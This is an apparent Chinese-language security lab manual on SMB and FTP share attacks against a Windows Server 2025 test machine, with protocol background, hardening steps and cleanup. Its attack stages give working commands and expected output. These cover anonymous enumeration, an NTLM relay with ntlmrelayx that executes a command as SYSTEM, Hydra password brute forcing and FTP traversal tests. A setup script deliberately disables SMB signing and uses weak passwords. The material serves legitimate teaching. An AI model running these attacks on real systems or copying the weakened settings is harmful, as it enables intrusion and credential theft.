---
color: "linear-gradient(45deg, #23d4fd 0%, #3a98f0 50%, #b721ff 100%)"
---
# 实验三：SMB与FTP共享服务渗透

<aside>
🧪

**对应章节**：项目三 Windows服务器共享管理

**实验目标**：掌握 SMB 匿名枚举、SMB Signing 与 NTLM Relay 风险、FTP 明文嗅探风险、共享权限边界验证与加固方法

**预计用时**：120 分钟 · **难度等级**：⭐⭐⭐（中级）

**前置知识**：实验二中的 NTLM 认证流程（挑战/响应机制）是理解本实验 SMB 中继攻击的基础

</aside>

---

# 第一部分：前置知识点

## 1. SMB协议深度解析

### 1.1 SMB协议工作原理

SMB（Server Message Block）是Windows文件共享的核心协议，通过**客户端-服务器**模型提供网络文件访问：

```
客户端（访问共享）              SMB协议（TCP 445）            服务器（提供共享）
┌───────────┐                                           ┌───────────┐
│ net use    │ ─── Negotiate（协商协议版本）──────────►    │           │
│ \\IP\share│ ◄── Negotiate Response（确定版本）────      │  SMB服务   │
│           │                                           │           │
│           │ ─── Session Setup（认证）──────────────►    │  srv2.sys│
│           │ ◄── Session Setup Response ─────────────  │  (内核驱动)│
│           │                                           │           │
│           │ ─── Tree Connect（连接共享名）────────►     │           │
│           │ ◄── Tree Connect Response ─────────────   │           │
│           │                                           │           │
│           │ ─── Open/Read/Write/Create（文件操作）──    │           │
└───────────┘                                           └───────────┘
```

### 1.2 SMB版本安全演进

```
SMBv1（已废弃）         SMBv2/2.1               SMBv3/3.1.1
────────────           ─────────              ───────────
Windows XP/2003         Windows 7/2008R2       Windows 10/2016+

❌ 协议层面存在漏洞      ✓ 减少协议往返           ✓ 端对端加密
❌ MS17-010永恒之蓝     ✓ 支持大MTU              ✓ 持续可用性
❌ 无加密支持            ✓ 管道化通信              ✓ 预认证完整性
❌ 无完整性校验          ✓ 签名支持                ✓ SMB over QUIC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ 关键教训：协议版本升级 ≠ 安全风险消除！
   SMBv3的压缩功能(CVE-2020-0796)同样可被利用
   → 根本防御 = 定期打补丁 + 禁用旧版本协议
```

### 1.3 SMB空会话（Null Session）

```
什么是空会话？
- 使用空的用户名和密码（Anonymous）建立SMB连接
- 可访问IPC$（进程间通信共享）
- 历史上用于网络浏览和枚举（兼容性设计）

空会话可以枚举什么？
┌─────────────────────────────────────────────┐
│ IPC$ 空会话 → 枚举能力                       │
├─────────────────────────────────────────────┤
│ ✓ 用户名列表（SAM枚举）                    │
│ ✓ 组列表                                    │
│ ✓ 共享资源列表                              │
│ ✓ 域用户/域信任信息（域环境）               │
│ ✗ 无法读取文件内容                         │
│ ✗ 无法执行命令                             │
└─────────────────────────────────────────────┘

防御：RestrictAnonymous = 2 + RestrictAnonymousSAM = 1
```

### 1.4 MS17-010（永恒之蓝）漏洞原理

```
漏洞本质：SMBv1协议中Trans2子命令处理函数的整数溢出

攻击流程（无需认证！）：
┌──────────┐                              ┌──────────┐
│ 攻击者    │  特制SMB数据包               │ 靶机      │
│           │  （触发堆溢出）               │  Win2008  │
│           │ ──────────────────────────►  │  R2       │
│           │                              │           │
│           │    覆盖返回地址               │  srv.sys  │
│           │    ◄──── shellcode ────────► │  内核态   │
│           │                              │           │
│           │    获取SYSTEM权限            │  权限执行 │
│           │ ◄──── Meterpreter ────────── │  shellcode│
└──────────┘                              └──────────┘

关键点：
- SMBv1才存在此漏洞 → 禁用SMBv1即可根本防御
- 无需任何认证 → 任何人都可以利用
- 内核态执行 → 获取SYSTEM最高权限
- 蠕虫式传播 → WannaCry/NotPetya使用的就是此漏洞
```

---

## 2. FTP协议安全分析

### 2.1 FTP双通道机制

```
主动模式（PORT）：
客户端:5000 ──21端口(控制)──► 服务器
客户端:5001 ◄──20端口(数据)──── 服务器（服务器主动连客户端）
                 ⚠️ 防火墙/NAT环境下失败

被动模式（PASV）：
客户端:5000 ──21端口(控制)──► 服务器
客户端:5001 ──随机高端口────► 服务器（客户端主动连服务器）
                 ✅ 防火墙/NAT环境友好

控制通道（21端口）：传输命令和响应
数据通道：传输文件内容
```

### 2.2 FTP安全致命弱点

```
┌──────────────────────────────────────────────────────┐
│ FTP 的三大安全缺陷                                    │
├──────────────────────────────────────────────────────┤
│ 1. 明文传输                                         │
│    用户名、密码、文件内容全部明文                     │
│    → 可被Wireshark/tcpdump直接嗅探                   │
│                                                      │
│ 2. 无加密                                           │
│    不支持TLS/SSL（FTPS是扩展，非常规配置）           │
│    → 中间人攻击可篡改传输内容                        │
│                                                      │
│ 3. 端口分离                                         │
│    控制端口和数据端口分离，防火墙配置复杂             │
│    → 被动模式需开放大量高端口                        │
└──────────────────────────────────────────────────────┘

替代方案：
- SFTP（SSH File Transfer Protocol）：端口22，SSH加密通道
- FTPS（FTP over TLS）：端口21，增加TLS加密层
- SCP（Secure Copy）：基于SSH，加密传输
```

---

## 3. 共享权限与NTFS权限计算规则

### 3.1 双层权限模型

```
用户通过网络访问共享文件夹时：
                    ┌─────────────────┐
                    │  共享权限        │ ← 网络访问入口
                    │  (Share Perm)   │
                    └────────┬────────┘
                             │ 取交集
                    ┌────────▼────────┐
                    │  NTFS权限       │ ← 文件系统控制
                    │  (NTFS Perm)   │
                    └────────┬────────┘
                             │
              最终有效权限 = min(共享权限, NTFS权限)
              ┌─────────────────────────────────────────┐
              │  例：共享权限=完全控制 + NTFS=读取     │
              │      最终 = 读取（取更严格的）         │
              │                                         │
              │  例：共享权限=读取 + NTFS=修改          │
              │      最终 = 读取（取更严格的）         │
              └─────────────────────────────────────────┘

⚠️ 拒绝（Deny）权限 > 允许（Allow）权限，无论在共享层还是NTFS层
```

> **实验关键提示**：本实验覆盖 SMB 和 FTP 两个攻击面。SMB 部分的核心是理解空会话枚举和 SMB 中继攻击（NTLM Relay）的危害；FTP 部分的核心是理解明文传输的安全风险。实验完成后需通过启用 SMB 签名、禁用 SMBv1、关闭匿名枚举等措施进行加固验证。

---

# 第二部分：实验操作

## 一、实验环境配置

### 1.1 网络拓扑

```
┌─────────────────────┐              NAT模式               ┌─────────────────────┐
│    Kali Linux       │           192.168.1.0/24             │  Windows Server     │
│   2025.4（攻击机）  │◄──────────────────────────────────►  │    2025（靶机）      │
│  IP: 192.168.1.10   │                                      │  IP: 192.168.1.20   │
└─────────────────────┘                                      └─────────────────────┘
```

> **注意**：Windows Server 2025 的 SMB 签名默认行为与旧版本不同——服务端签名默认不要求，但**客户端签名默认要求**。靶机初始化脚本已关闭客户端签名以满足中继攻击演示需求。所有实验步骤均可在 Windows Server 2025 上完成。

### 1.2 靶机环境详细配置

**虚拟机设置**：

| 项目 | 配置 |
| --- | --- |
| 操作系统 | Windows Server 2025 Standard（桌面体验版） |
| 内存 | 4 GB |
| 硬盘 | 60 GB |
| 网络适配器 | NAT模式 |
| 快照 | 实验前创建快照（命名：实验三-初始状态） |

**靶机初始化脚本**（管理员PowerShell执行）：

```powershell
# ============================================
# 靶机环境初始化脚本 - 实验三
# ============================================

# --- 1. 创建测试用户和组 ---
net user Jerry P@ssw0rd123 /add /comment:"Sales Department"
net user Tom P@ssw0rd123 /add /comment:"Finance Department"
net localgroup 部门A /add
net localgroup 部门B /add
net localgroup 部门A Jerry /add
net localgroup 部门B Tom /add

# --- 2. 创建共享文件夹结构 ---
mkdir C:\SharedFolder\Sales
mkdir C:\SharedFolder\Finance
echo "Sales Q1 Report - Confidential" > C:\SharedFolder\Sales\secret_sales.txt
echo "Finance Annual Report" > C:\SharedFolder\Finance\report.xlsx

# --- 3. 配置共享和权限 ---
# 创建共享（Everyone完全控制，依赖NTFS权限做细粒度控制）
New-SmbShare -Name "CompanyShare" -Path "C:\SharedFolder" `
  -FullAccess "Everyone" -Description "Company Shared Files"

# 配置NTFS权限（Jerry只读Sales，Tom可改Finance）
icacls C:\SharedFolder\Sales /grant "Jerry:(OI)(CI)R"
icacls C:\SharedFolder\Finance /grant "Tom:(OI)(CI)M"
```

```powershell
# --- 4. 安装IIS FTP服务 ---
Install-WindowsFeature Web-Server, Web-FTP-Server, `
  Web-FTP-Service -IncludeManagementTools

# 创建FTP根目录
mkdir C:\FTPRoot
echo "FTP Test File" > C:\FTPRoot\readme.txt

# 创建FTP站点
Import-Module WebAdministration
New-WebFtpSite -Name "CompanyFTP" -Port 21 `
  -PhysicalPath "C:\FTPRoot"

# 配置FTP身份验证：启用基本认证，禁用匿名
Set-ItemProperty "IIS:\Sites\CompanyFTP" `
  -Name ftpServer.security.authentication.basicAuthentication.enabled `
  -Value $true
Set-ItemProperty "IIS:\Sites\CompanyFTP" `
  -Name ftpServer.security.authentication.anonymousAuthentication.enabled `
  -Value $false

# 授权Jerry和Tom访问FTP
Add-WebConfiguration "/system.ftpServer/security/authorization" `
  -Value @{accessType="Allow";users="Jerry,Tom";permissions="Read,Write"} `
  -PSPath IIS:\ -Location "CompanyFTP"
```

```powershell
# --- 5. 确保SMB签名未启用（实验需要） ---
# Windows Server 2025 默认：服务端签名不要求，但客户端签名要求
# 实验中继攻击需要同时关闭服务端和客户端签名
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force

# --- 6. 开放防火墙端口 ---
New-NetFirewallRule -DisplayName "SMB-In" -Direction Inbound `
  -Protocol TCP -LocalPort 445 -Action Allow
New-NetFirewallRule -DisplayName "FTP-In" -Direction Inbound `
  -Protocol TCP -LocalPort 21 -Action Allow
New-NetFirewallRule -DisplayName "FTP-Data" -Direction Inbound `
  -Protocol TCP -LocalPort 1024-65535 -Action Allow

Write-Host "环境初始化完成！" -ForegroundColor Green
```

---

## 二、实验步骤

### 阶段一：SMB匿名访问与枚举

**步骤1：检查SMB共享是否允许匿名访问**

```bash
# 使用smbclient尝试匿名访问
smbclient -L //192.168.1.20 -N

# 预期输出（如允许匿名）：
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# CompanyShare    Disk
# IPC$            IPC       Remote IPC

# 使用enum4linux-ng全面枚举（Kali 2025 推荐替代 enum4linux）
enum4linux-ng -A 192.168.1.20

# 检查是否可以通过空会话枚举用户
rpcclient -U "" 192.168.1.20 -N -c "enumdomusers"
rpcclient -U "" 192.168.1.20 -N -c "enumdomgroups"
```

> **知识关联**：对应讲义中”匿名访问控制与枚举防护”——Windows默认允许空会话连接IPC$，可枚举用户和共享。

**步骤2：枚举共享权限和ACL**

```bash
# 使用smbcacls查看共享权限
smbcacls //192.168.1.20/CompanyShare -N

# 使用NetExec枚举（Kali 2025 中 crackmapexec 已被 netexec/nxc 替代）
nxc smb 192.168.1.20 --shares
nxc smb 192.168.1.20 --users

# 尝试访问各个共享
smbclient //192.168.1.20/CompanyShare -N -c "ls"
smbclient //192.168.1.20/C$ -N -c "ls"
smbclient //192.168.1.20/ADMIN$ -N -c "ls"
```

---

### 阶段二：SMB版本识别与安全检测

**步骤3：识别SMB协议版本**

```bash
# 使用Nmap识别SMB版本
nmap -p 445 --script smb-protocols 192.168.1.20
# 预期输出：
# PORT     STATE SERVICE
# 445/tcp open  microsoft-ds
# | smb-protocols:
# |   dialects:
# |     2.0.2
# |     2.1
# |     3.0
# |     3.0.2
# |     3.1.1
# 注意：Windows Server 2025 默认不安装 SMBv1，列表中不会出现 NT LM 0.12

# 使用NetExec识别版本
nxc smb 192.168.1.20

# 使用smbclient指定协议版本连接
smbclient -L //192.168.1.20 -N -m NT1
# 注意：NT1是SMBv1的方言名称，Windows Server 2025 默认未安装 SMBv1，连接会被拒绝
```

> **知识关联**：对应讲义中”SMB版本演进”——SMBv1已被废弃但旧系统仍默认启用，存在MS17-010等严重漏洞。

**步骤4：检测SMB签名状态**

```bash
# SMB签名是防止NTLM中继攻击的关键防御措施
# 当SMB签名未启用时，攻击者可以将截获的NTLM认证中继到其他服务器

# 使用NetExec检测SMB签名状态
nxc smb 192.168.1.20
# 输出中的 signing 字段：
# SMB  192.168.1.20  445  TARGET  [*] ... (signing:False)
# signing:False ← 表示签名未强制启用（存在中继风险）

# 使用Nmap脚本检测SMB安全模式
nmap -p 445 --script smb-security-mode 192.168.1.20

# 使用NetExec生成可中继目标列表（扫描网段中签名未启用的主机）
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# 输出SMB签名未启用的主机IP到relay_targets.txt

# 知识要点：
# - SMB签名=对每个SMB消息添加数字签名，防止中间人篡改
# - 签名未启用时，NTLM认证可被透明转发到其他服务器（中继攻击）
# - Windows Server 2025 默认：服务端签名不要求（工作组），客户端签名要求
#   （靶机初始化脚本已关闭客户端签名以满足实验需求）
# - 防御措施：RequireSecuritySignature = $true
```

> **知识关联**：对应讲义中”SMB安全”——SMB签名（SMB Signing）通过对消息进行数字签名来防止中间人篡改和NTLM中继攻击。

### 阶段三：SMB中继攻击（NTLM Relay）

**步骤5：SMB中继攻击演示**

```
# ═══════════════════════════════════════════════════════════════
# SMB中继攻击原理（回顾实验二的NTLM认证流程）：
# ═══════════════════════════════════════════════════════════════
# 实验二中我们学过NTLM挑战/响应认证：
#   客户端 → 服务器：我是Jerry
#   服务器 → 客户端：Challenge（随机数）
#   客户端 → 服务器：Response = HMAC(Challenge, NTLM_Hash)
#
# 中继攻击的关键洞察：
#   攻击者站在中间，把服务器发来的Challenge转发给受害者，
#   再把受害者算出的Response转发给服务器。
#   如果目标服务器未启用SMB签名，无法验证消息来源，直接接受认证！
#
# 攻击者无需知道密码，即可"借用"受害者的身份访问目标服务器。
# ═══════════════════════════════════════════════════════════════

# 终端1：在Kali上启动ntlmrelayx中继工具
# 前置步骤：关闭Kali本机的SMB服务，释放445端口
sudo systemctl stop smbd nmbd 2>/dev/null
sudo killall smbd nmbd 2>/dev/null

# 准备中继目标列表（目标是靶机）
echo "192.168.1.20" > /tmp/targets.txt

# 启动SMB中继监听
# -tf：目标文件  -smb2support：支持SMBv2  -c：中继成功后执行的命令
sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -c "whoami"

# 预期输出（等待连接）：
# [*] Protocol Client SMB loaded..
# [*] Running in relay mode to hosts in /tmp/targets.txt
# [*] SMB server started on 0.0.0.0:445

# 终端2：模拟受害者被诱导连接攻击者的SMB服务
# 在靶机（Windows Server）上以Jerry身份执行：
# （模拟场景：Jerry打开了钓鱼邮件中的UNC链接）
net use \\192.168.1.10\share /user:Jerry P@ssw0rd123

# 回到终端1，观察ntlmrelayx输出：
# [*] SMBD: Received connection from 192.168.1.20
# [*] Authenticating against smb://192.168.1.20 as WORKGROUP/JERRY
# [*] SMB signing is NOT required on 192.168.1.20
# [+] Relay to 192.168.1.20 succeeded!
# [+] Executed command: whoami
# [+] Result: nt authority\system
#
# 关键观察：攻击者从未输入Jerry的密码，却获得了目标服务器的访问权限！
```

> **知识关联**：对应实验二 §1.2 NTLM认证流程——中继攻击利用了NTLM协议"不验证消息来源"的设计缺陷。实验二中我们学到Response只需NTLM Hash即可计算，中继攻击更进一步：连Hash都不需要，直接转发整个认证过程。

**步骤6：启用SMB签名防御中继攻击**

```powershell
# 在靶机上启用SMB签名（需要管理员权限）
# 启用SMB服务端签名（服务器发出的消息带签名）
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
# 启用SMB客户端签名（Windows Server 2025 默认已启用，此处显式确认）
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# 验证签名已启用
Get-SmbServerConfiguration | Select RequireSecuritySignature
Get-SmbClientConfiguration | Select RequireSecuritySignature
# 预期：均为 True
```

从 Kali 重新检测并验证中继攻击失败：

```bash
# 从Kali重新检测SMB签名状态
nxc smb 192.168.1.20
# 输出变化：
# SMB  192.168.1.20  445  TARGET  [*] ... (signing:True)  ← 签名已强制启用

# 再次运行中继攻击
sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -c "whoami"

# 在靶机上再次模拟受害者连接：
net use \\192.168.1.10\share /user:Jerry P@ssw0rd123

# 预期：中继失败！
# [-] Signing is required on 192.168.1.20, skipping...
# [*] No targets left to relay to, exiting.
```

```
加固前后对比总结：
┌──────────────────────────────────────────────────────┐
│  状态       │  SMB签名    │  中继攻击结果            │
├─────────────┼─────────────┼──────────────────────────┤
│  加固前     │  未启用     │  中继成功，执行命令      │
│  加固后     │  已启用     │  中继失败，目标被跳过    │
└──────────────────────────────────────────────────────┘

原理：启用签名后，每个SMB消息都附带基于会话密钥的数字签名。
攻击者虽然能转发消息，但无法伪造签名（因为不知道会话密钥），
目标服务器验签失败 → 拒绝连接。
```

> **知识关联**：对应讲义中”SMB安全”——NTLM中继攻击利用SMB签名未启用的弱点，将截获的认证请求转发到目标服务器。启用SMB签名是最有效的防御手段。

---

### 阶段四：FTP服务渗透

**步骤7：FTP匿名登录测试**

```
# 检测FTP是否允许匿名登录
nmap -p 21 --script ftp-anon 192.168.1.20

# 尝试匿名登录
ftp 192.168.1.20
# 用户名：anonymous
# 密码：（空）

# 使用curl测试
curl -v ftp://192.168.1.20/
curl -v ftp://192.168.1.20/ --user anonymous:
```

**步骤8：FTP弱口令暴力破解**

```
# 首先在Kali上创建密码字典
cat > /tmp/passwords.txt << 'EOF'
123456
password
admin
P@ssw0rd
P@ssw0rd123
letmein
qwerty
abc123
EOF

# 使用Hydra进行FTP爆破
hydra -l Jerry -P /tmp/passwords.txt ftp://192.168.1.20
hydra -l Tom -P /tmp/passwords.txt ftp://192.168.1.20

# 预期输出：
# [21][ftp] host: 192.168.1.20   login: Jerry   password: P@ssw0rd123
# [21][ftp] host: 192.168.1.20   login: Tom     password: P@ssw0rd123
```

**步骤9：FTP协议明文嗅探**

```
# 在Kali上启动Wireshark监听eth0网卡
wireshark -i eth0

# 然后进行FTP登录操作
ftp 192.168.1.20
# 登录：Jerry / P@ssw0rd123

# 在Wireshark中过滤FTP流量
# 过滤条件：ftp || tcp.port == 21
# 观察到明文传输的用户名和密码！
```

> **知识关联**：对应讲义中”FTP工作原理”——FTP控制通道（21端口）的账号密码为明文传输，可被网络嗅探截获。

**步骤10：文件上传与目录遍历测试**

```
# 使用获取的FTP凭据登录
ftp 192.168.1.20
# 用户名：Jerry
# 密码：P@ssw0rd123

# 查看当前目录（确认FTP根目录）
pwd
ls

# 测试目录遍历（尝试跳出FTP根目录）
cd ../../
pwd
# 如果能跳出FTP根目录 → FTP用户隔离未配置（严重风险）

cd ../../../Windows/System32/
# 如果成功 → 攻击者可读取系统文件

# 测试文件上传权限
echo "test upload" > /tmp/test_upload.txt
put /tmp/test_upload.txt
# 如果成功 → 写入权限过宽，攻击者可上传恶意文件

# 安全风险总结：
# 1. 目录遍历成功 → 可访问整个文件系统
# 2. 写入权限过宽 → 可上传恶意文件到Web目录（若FTP与IIS共用目录）
# 3. 结合实验四（IIS）：若FTP目录与Web根目录重合，上传的文件可被HTTP访问执行
```

---

### 阶段五：共享权限越权测试

**步骤11：使用获取的凭据测试共享权限边界**

```
# 使用Jerry（部门A - 应只有读取权限）
smbclient //192.168.1.20/CompanyShare -U Jerry%'P@ssw0rd123'
# 尝试读取
smb: \> cd Sales
smb: \Sales\> get secret_sales.txt /tmp/
# 尝试写入（应该被拒绝）
smb: \Sales\> put /tmp/malicious.txt
# 如果成功写入 → 共享权限配置有误（权限过宽）

# 尝试访问Finance目录
smb: \> cd Finance
# 如果能访问 → NTFS权限可能配置不当

# 使用Tom（部门B - 应有更改权限）
smbclient //192.168.1.20/CompanyShare -U Tom%'P@ssw0rd123'
smb: \> cd Finance
smb: \Finance\> get report.xlsx /tmp/
smb: \Finance\> put /tmp/test.txt
# 如果能删除文件 → 权限过宽
```

> **知识关联**：对应讲义中”共享权限与NTFS权限”——最终有效权限=min(共享权限, NTFS权限)，需验证两者是否正确配置。

---

### 阶段六：SMB安全加固验证

**步骤12：禁用SMBv1并关闭匿名枚举**

```powershell
# 禁用SMBv1（服务端）
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# 确认 SMBv1 功能未安装（Windows Server 2025 默认不安装 SMBv1）
Get-WindowsFeature FS-SMB1
# 如果 Install State 显示 Installed，则执行移除：
# Remove-WindowsFeature FS-SMB1

# 启用SMB服务端和客户端签名（加固核心）
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# 关闭匿名枚举
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymousSAM /t REG_DWORD /d 1 /f

# 禁止存储网络凭据
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableDomainCreds /t REG_DWORD /d 1 /f

# 强制刷新策略
gpupdate /force

# 验证SMBv1已禁用
Get-SmbServerConfiguration | Select EnableSMB1Protocol
# 预期：False
```

**步骤13：验证加固效果**

```
# SMBv1连接应失败（NT1是SMBv1的方言名称）
smbclient -L //192.168.1.20 -N -m NT1
# 预期：连接失败，提示协议被拒绝

# 匿名枚举应失败
smbclient -L //192.168.1.20 -N
# 预期：NT_STATUS_ACCESS_DENIED

enum4linux-ng -A 192.168.1.20
# 预期：大量枚举结果返回空或被拒绝

# NetExec验证
nxc smb 192.168.1.20 --shares
# 预期：无法获取共享列表
```

---

## 三、实验报告要求

| 序号 | 记录项 | 说明 |
| --- | --- | --- |
| 1 | SMB匿名枚举结果 | 发现的共享、用户、组 |
| 2 | SMB中继攻击演示 | ntlmrelayx中继成功/失败的截图 |
| 3 | FTP嗅探结果 | Wireshark中明文密码的截图 |
| 4 | 共享权限越权测试 | 各账户的实际权限边界 |
| 5 | 加固前后对比 | 启用SMB签名和关闭匿名枚举后的效果 |

### 思考题

1. SMB中继攻击为什么能在不需要密码的情况下获取服务器访问权限？
2. 启用SMB签名后，中继攻击为什么无法成功？
3. FTP明文传输问题有哪些替代方案？
4. 如何确保共享文件夹的权限配置不会出现越权访问？
5. 为什么关闭匿名枚举（RestrictAnonymous=2）是重要的安全措施？

---

## 四、实验清理

```powershell
# 1. 删除测试用户和组
net user Jerry /delete
net user Tom /delete
net localgroup 部门A /delete
net localgroup 部门B /delete

# 2. 删除共享和FTP站点
net share CompanyShare /delete
Import-Module WebAdministration
Remove-WebSite -Name "CompanyFTP"

# 3. 删除测试目录
Remove-Item -Recurse -Force C:\SharedFolder
Remove-Item -Recurse -Force C:\FTPRoot

# 4. 恢复SMB签名为默认值（Windows Server 2025 默认：服务端不要求，客户端要求）
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# 5. 删除防火墙规则
Remove-NetFirewallRule -DisplayName "SMB-In"
Remove-NetFirewallRule -DisplayName "FTP-In"
Remove-NetFirewallRule -DisplayName "FTP-Data"

# 6. 卸载IIS（可选）
# Remove-WindowsFeature Web-Server, Web-FTP-Server
```

> **免责声明**：本实验仅用于授权的安全教学环境。SMB中继攻击涉及网络协议层面的安全测试，请确保在隔离的虚拟机环境中操作，切勿在生产网络中执行。

---

## 五、知识链衔接

```
实验二（本地认证攻击）          实验三（网络服务攻击）          实验四（Web服务攻击）
─────────────────────         ─────────────────────         ─────────────────────
NTLM认证流程                   SMB中继（NTLM Relay）          IIS请求管道
Pass-the-Hash                  SMB匿名枚举                    HTTP方法探测
SAM/LSASS凭据提取              FTP明文嗅探                    目录遍历/WebShell
                               共享权限越权                    安全响应头

衔接关系：
• 实验二的NTLM认证知识 → 实验三SMB中继攻击的理论基础
• 实验三的FTP服务（IIS组件） → 实验四IIS Web安全审计的前置铺垫
• 实验三的共享权限模型 → 实验四的NTFS权限与IIS虚拟目录权限对照
```